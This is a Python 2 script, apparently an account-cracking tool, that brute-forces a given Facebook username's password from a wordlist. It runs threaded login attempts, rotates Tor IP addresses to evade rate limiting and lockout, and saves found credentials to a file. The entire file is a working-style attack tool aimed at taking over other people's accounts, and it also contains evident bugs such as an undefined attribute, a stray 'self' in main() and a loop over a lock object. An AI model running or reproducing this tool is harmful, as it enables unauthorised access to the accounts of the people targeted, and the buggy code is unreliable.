import os
import time
import argparse
import threading
import subprocess

from include.browser import Browser
from include.tor import TorManager

class Bruter(TorManager, Browser):

    def __init__(self, username, wordlist):
        self.username = username
        self.wordlist = wordlist
        self.lock = threading.Lock()

        self.ip = None #current ip address
        self.tries = 0
        self.alive = True #Bruter still running
        self.locked = False #to see if facebook locks out
        self.is_found = False #is password found
        self.site_name = 'Facebook'

        self.pass_list = [] #temp storage for passwords
        self.recent_ip = [] #temp storage for ip addresses

        #Browser Config
        self.url = 'https://www.facebook.com/login.php'
        Browser.__init__(self)
        TorManager.__init__(self)

        #color config
        self.n = '\033[0m'  # null ---> reset
        self.r = '\033[31m' # red
        self.g = '\033[32m' # green
        self.y = '\033[33m' # yellow
        self.b = '\033[34m' # blue

    def kill(self, msg = None):
        try:
            if self.is_found:
                self.display(msg)
                print '     [-] Password Found'

            with open('cracked.txt', 'a') as f:
                f.write('[-] Username: {}\n[-] Password: {}\n\n'.\
                format(self.site_name, self.username, msg))

            if all([not self.is_found, msg]):
                print '\n [-] {}'.format(msg)

            self.alive = False
            self.stop_tor()
        finally:
            exit()

    def modify_list(self):
        if len(self.recent_ip) > 5:
            while all([len(self.recent_ip) > 4]):
                del self.recent_ip[0]

    def manage_ip(self, rec = 2):
        ip = self.getIp()
        if ip:
            if ip in self.recent_ip:
                self.update_ip()
                self.manage_ip()
            self.ip = ip
            self.recent_ip.append(ip)
        else:
            if rec:
                self.update_ip()
                self.manage_ip(rec - 1)
            else:
                self.kill('Lost Connection'.format(self.y, self.r, self.n))

    def channge_ip(self):
        self.create_browser()
        self.update_ip()

        self.manage_ip()
        self.modify_list()
        self.delete_browser()

    def setup_passwords(self):
        with open(self.wordlist, 'r') as passwords:
            for pwd in passwords:
                pwd = pwd.replace('\n', '')
                if len(self.pass_list) < 5:
                    self.pass_list.append(pwd)
                else:
                    while all([self.alive, len(self.pass_list)]):
                        pass
                    if not len(self.pass_list):
                        self.pass_list.append(pwd)
        #file reading done
        while self.alive:
            if not len(self.pass_list):
                self.alive = False

    def attempt(self, pwd):
        while self.lock:
            self.tries += 1
            self.create_browser()
            html = self.login(self.username, pwd)

        if html:
            self.locked = True if '/help/contact/' in html else self.locked
            if self.locked:
                self.display(pwd)
                self.kill('{} is {} locked, please try again in a bit.'.\
                format(self.username, self.r, self.n))

            if any(['save-device' in html, 'home.php' in html]):
                self.is_found = True
                self.kill(pwd)

            del self.pass_list[self.pass_list.index(pwd)]
        self.delete_browser()

    def display(self, pwd = None):
        pwd = pwd if pwd else ''
        ip = self.ip if self.ip else ''
        color = self.r if self.locked else self.g
        creds = self.r if not self.isFound else self.g # credentials color
        attempts = self.tries if self.tries else ''

        subprocess.call(['clear'])
        print '     {}[-] Proxy Ip: {}{}'.format(self.n, self.ip)
        print '     {}[-] Wordlist: {}{}'.format(self.n, self.b, self.wordlist)
        print '     {}[-] Username: {}{}'.format(self.n, creds, self.username)
        print '     {}[-] Password: {}{}'.format(self.n, creds, pwd)
        print '     {}[*] Attempts: {}{}'.format(self.n, self.b, attempts)

        if not ip:
            print '     [#] Obtaining Proxy IP {}...{}'.format(self.g, self.n)
            self.channge_ip()
            time.sleep(1.5)
            self.display()

    def run(self):
        self.display()
        time.sleep(1.5)
        threading.Thread(target=self.setup_passwords).start()
        while self.alive:
            bot = None

            for pwd in self.pass_list:
                bot = threading.Thread(target=self.attempt, args=[pwd])
                bot.start()

            if bot:
                while all([self.alive, bot.is_alive()]):
                    pass
                if self.alive:
                    self.channge_ip()


def main():
    args = argparse.ArgumentParser()
    args.add_argument('username', help='Email or Username')
    args.add_argument('wordlist', help='Wordlist')
    args = args.parse_args()
    #assigning varuables
    engine = Bruter(args.username, args.wordlist)
    #Checking if tor is available
    if not os.path.exists('/usr/sbin/tor'):
        try:
            engine.install_tor()
        except KeyboardInterrupt:
            engine.kill('Exiting {}...{}'.format(self.g, self.n))
        if not os.path.exists('/usr/sbin/tor'):
            engine.kill('Please Install Tor'.format(engine.y,engine.r,engine.n))

    #start attck
    try:
        engine.run()
    finally:
        if all([not engine.is_found,  not engine.locked]):
            engine.kill('Exitimg {}...{}'.format(engine.g,engine.n))

if __name__ == '__main__':
    if os.getuid():
        exit('root access required')
    else:
        main()